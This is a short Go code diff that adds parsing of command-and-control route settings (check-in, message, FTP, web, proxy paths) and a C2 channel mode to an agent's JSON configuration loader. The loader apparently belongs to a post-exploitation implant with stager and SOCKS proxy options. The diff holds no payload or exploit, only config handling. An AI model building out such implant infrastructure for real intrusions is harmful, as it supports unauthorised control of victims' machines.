@@ -42,6 +42,16 @@ func readJSONConfig(jsonData []byte, config_to_write *def.Config) (err error) {
 		return false
 	}
 
+	// Helper to safely extract string values from an object map.
+	getStringFromMap := func(obj map[string]any, keys ...string) string {
+		for _, key := range keys {
+			if val, ok := obj[key].(string); ok {
+				return val
+			}
+		}
+		return ""
+	}
+
 	config_to_write.CCAddress = getString("cc_address")
 	config_to_write.CCHost = getString("cc_host")
 	config_to_write.CCPort = getString("cc_port")
@@ -94,6 +104,18 @@ func readJSONConfig(jsonData []byte, config_to_write *def.Config) (err error) {
 	config_to_write.Jitter = getInt("jitter")
 	config_to_write.ModulePath = getString("module_path")
 	config_to_write.IsRunByStager = getBool("is_run_by_stager")
+	if val, ok := raw["c2_routes"].(map[string]any); ok {
+		config_to_write.C2Routes.Checkin = getStringFromMap(val, "checkin", "Checkin")
+		config_to_write.C2Routes.Msg = getStringFromMap(val, "msg", "Msg")
+		config_to_write.C2Routes.FTP = getStringFromMap(val, "ftp", "FTP")
+		config_to_write.C2Routes.WWW = getStringFromMap(val, "www", "WWW")
+		config_to_write.C2Routes.Proxy = getStringFromMap(val, "proxy", "Proxy")
+	}
+	def.NormalizeC2Routes(&config_to_write.C2Routes)
+	config_to_write.C2ChannelMode = getString("c2_channel_mode")
+	if config_to_write.C2ChannelMode == "" {
+		config_to_write.C2ChannelMode = def.C2ChannelModeDefault
+	}
 
 	calculateReverseProxyPort := func() (string, error) {
 		p, err := strconv.Atoi(config_to_write.AgentSocksServerPort)
